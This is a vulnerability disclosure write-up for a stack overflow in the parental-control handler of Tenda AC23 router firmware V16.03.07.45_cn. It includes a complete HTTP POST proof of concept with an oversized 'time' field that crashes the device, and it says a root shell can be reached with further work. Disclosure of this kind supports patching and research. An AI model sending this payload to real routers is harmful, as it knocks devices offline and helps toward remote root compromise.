# Tenda AC23 V16.03.07.45_cn Stack overflow vulnerability

## Firmware information

- Manufacturer's address: https://www.tenda.com.cn/
- Firmware download address: https://www.tenda.com.cn/download/detail-3420.html

## Affected version

I have verified that **Tenda AC23 V16.03.07.45_cn** products have stack overflow vulnerability, and other series products have not been verified for the time being.

![image-20230811102239367](./img/image-20230811102239367.png)



## Vulnerability details

![image-20230811094531781](./img/image-20230811094531781.png)

```
saveParentControlInfo -> compare_parentcontrol_time
```

`compare_parentcontrol_time`

![image-20230810212355050](./img/image-20230810212355050.png)

This function gets the parameter **time** from the user input, but does not verify the length of the user input. The `sscanf`function is then called to assign **time** directly to the **stack**, resulting in a stack overflow vulnerability.



## POC

```
POST /goform/saveParentControlInfo HTTP/1.1
Host: 192.168.0.1
Content-Length: 1100
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/parental_control.html?random=0.9022020837028655&
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: password=25d55ad283aa400af464c76d713c07adbfrcvb
Connection: close

deviceId=00%3A1b%3A44%3A11%3A3a%3Ab7&deviceName=&enable=1&time=19%3A00-21%3Aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

By running the poc, you can see the crash.

![image-20230819120737475](./img/image-20230819120737475.png)

![image-20230819120805777](./img/image-20230819120805777.png)

With careful construction of the exp, we can finally get the root shell.







